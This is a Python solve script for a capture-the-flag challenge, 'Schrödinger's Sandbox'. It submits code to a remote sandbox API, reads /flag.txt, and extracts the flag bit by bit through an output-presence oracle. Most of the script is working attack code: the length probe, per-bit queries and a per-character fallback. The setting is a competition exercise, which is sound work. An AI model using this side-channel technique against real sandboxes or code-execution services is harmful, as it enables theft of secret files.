"""
Schrödinger's Sandbox - Approach 3: Error-based oracle (bit by bit)

Key insight: We can use the RESPONSE BEHAVIOR to distinguish cases.

If both universes produce the same output → we see it (success).
If they differ → we see nothing or an error.

Strategy: For each bit of each character of the flag, submit code that:
- Prints a FIXED string if the bit is 1
- Prints a DIFFERENT fixed string if the bit is 0

Since the fake flag and real flag differ at certain positions:
- If both have the same bit → outputs match → we see the result → we know the bit
- If bits differ → no output → we know the flags differ at this bit

For positions where flags differ, we need to determine WHICH universe
has which value. Since the real flag matches 0xfun{...} format, we can
use that to disambiguate.

ALTERNATE APPROACH: Use exception/crash as oracle.
If we crash on a specific condition, the outputs differ.
We use the PRESENCE or ABSENCE of output as a 1-bit oracle.
"""

import requests
import string
import sys
import time

TARGET = "http://chall.0xfun.org:11102"

def oracle(code):
    """Submit code and return the response text, or None on error."""
    try:
        r = requests.post(
            f"{TARGET}/api/submit",
            json={"code": code.strip()},
            timeout=15,
        )
        return r.text.strip() if r.status_code == 200 else f"ERR:{r.status_code}"
    except Exception as e:
        return f"EXCEPTION:{e}"


def test_bit(pos, bit_pos):
    """
    Test if bit `bit_pos` of flag[pos] is 1.

    Code prints "A" regardless of the bit value.
    If both universes agree → we see "A".

    Instead, let's make the output DEPEND on the bit:
    - Print "1" if bit is set, "0" if not
    - If output matches → both flags have same bit → we know it
    - If no output → bits differ → we need to figure out which is real
    """
    code = f"""
flag = open("/flag.txt").read().strip()
if len(flag) > {pos}:
    bit = (ord(flag[{pos}]) >> {bit_pos}) & 1
    print(bit)
else:
    print(-1)
"""
    return oracle(code)


def test_char_equals(pos, target_ord):
    """
    Test if flag[pos] == chr(target_ord).
    Prints "MATCH" if true, "NO" if false.
    We see output only if both universes agree.
    """
    code = f"""
flag = open("/flag.txt").read().strip()
if len(flag) > {pos} and ord(flag[{pos}]) == {target_ord}:
    print("MATCH")
else:
    print("NO")
"""
    return oracle(code)


def test_char_greater(pos, threshold):
    """
    Test if ord(flag[pos]) > threshold.
    Both print same → we see it.
    """
    code = f"""
flag = open("/flag.txt").read().strip()
if len(flag) > {pos}:
    print("1" if ord(flag[{pos}]) > {threshold} else "0")
else:
    print("X")
"""
    return oracle(code)


def extract_bit_by_bit():
    print("[*] Schrödinger's Sandbox - Bit-by-bit extraction")
    print(f"[*] Target: {TARGET}\n")

    # First, test connectivity
    test_code = 'print("hello")'
    result = oracle(test_code)
    print(f"[*] Connectivity test: {repr(result)}")

    # Try to get length
    for try_len in range(20, 80):
        code = f"""
flag = open("/flag.txt").read().strip()
print("1" if len(flag) == {try_len} else "0")
"""
        result = oracle(code)
        if result and "1" in result:
            print(f"[+] Both flags have length {try_len}")
            flag_len = try_len
            break
    else:
        print("[!] Could not determine common length, trying 50")
        flag_len = 50

    # Extract bit by bit
    known_flag = []
    for pos in range(flag_len):
        char_val = 0
        all_bits_agreed = True

        for bit in range(8):
            result = test_bit(pos, bit)
            if result and result in ("0", "1"):
                char_val |= int(result) << bit
            else:
                all_bits_agreed = False
                # Try the char-level approach
                break

        if all_bits_agreed:
            known_flag.append(chr(char_val))
            print(f"[+] pos {pos}: '{chr(char_val)}' (0x{char_val:02x})")
        else:
            # Flags differ at this position - use binary search with oracle
            # We know it's one of the printable chars
            # Use the match/no-match as oracle
            found = False
            for c in range(32, 127):
                result = test_char_equals(pos, c)
                if result and "MATCH" in result:
                    known_flag.append(chr(c))
                    print(f"[+] pos {pos}: '{chr(c)}' (both match)")
                    found = True
                    break

            if not found:
                known_flag.append("?")
                print(f"[?] pos {pos}: unknown (flags differ, neither matched all guesses)")

        time.sleep(0.05)

    flag_str = "".join(known_flag)
    print(f"\n[*] Extracted flag: {flag_str}")
    return flag_str


if __name__ == "__main__":
    extract_flag = extract_bit_by_bit()
